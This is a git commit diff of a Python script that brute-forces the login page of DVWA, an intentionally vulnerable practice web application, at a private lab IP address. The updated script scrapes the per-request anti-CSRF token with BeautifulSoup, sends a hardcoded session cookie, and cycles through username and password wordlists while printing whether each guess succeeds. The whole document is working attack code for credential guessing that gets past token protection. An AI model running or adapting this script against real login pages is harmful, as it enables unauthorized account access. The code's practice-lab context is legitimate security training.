c0198cf6a45babc830b9dd8ae6ee9e8233ff5960
Koctr <koctr@china.com>
2019-04-22 07:09:37 +0800

    sql_dvwa_brute_force.py

--- web_security/dvwa_brute_force.py
+++ web_security/dvwa_brute_force.py
@@ -3,49 +3,42 @@
 
 
 import requests
-import re
-
+# import re
+from bs4 import BeautifulSoup
 
 ip = "192.168.203.128"
-login_page = "http://%s/dvwa/login.php" % ip
-r=requests.get(login_page)
-login_token=re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]
-
-login_data = {
-    "username":"admin",
-    "password":'password',
-    "Login":'Login',
-    'user_token':login_token
+headers = {
+    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
+    "Cookie": "security=high; PHPSESSID=5qa8beu11tlu6s79pfdv2jluk7"
 }
-r=requests.get(login_page,params=login_data)
-print(r.url)
-usernames = open("small.txt", 'r', encoding="utf-8")
-passwords = open("common_pass.txt", 'r', encoding='utf-8')
 
-for username in usernames:
-    for password in passwords:
-        url = "http://192.168.203.128/dvwa/vulnerabilities/brute/"
-        r = requests.get(url)
-        print(r.url)
-        token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]
-        print(token)
-        get_data = {
-            "user_token": token,
-            "username": username,
-            "password": password,
-            "Login": "Login"
-        }
-        print('-' * 20)
-        print('用户名：', username)
-        print('密码：', password)
-        r = requests.get(url, params=get_data)
-        print(r.url)
-        if 'Username and/or password incorrect.' in r.text:
-            print(1)
-            print('破解失败')
-        else:
-            print('破解成功')
-        print('-' * 20)
-
-usernames.close()
-passwords.close()
+"""
+# name只会循环一次，为什么？
+for u in names:
+    for p in pwds:
+        print(u, p)
+"""
+with open("small.txt", 'r', encoding="utf-8") as names:
+    for username in names:
+        with open("common_pass.txt", 'r', encoding='utf-8') as passwords:
+            for password in passwords:
+                url = "http://%s/dvwa/vulnerabilities/brute/" % ip
+                r = requests.get(url, headers=headers)
+                soup = BeautifulSoup(r.text, "html.parser")
+                token = soup.find_all("input")[3].get("value")
+                # token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]
+                get_data = {
+                    "user_token": token,
+                    "username": username.strip(),
+                    "password": password.strip(),
+                    "Login": "Login"
+                }
+                print('-' * 20)
+                print('用户名：', username.strip())
+                print('密码：', password.strip())
+                r = requests.get(url, params=get_data, headers=headers)
+                if 'Username and/or password incorrect.' in r.text:
+                    print('破解失败')
+                else:
+                    print('破解成功')
+                print('-' * 20)
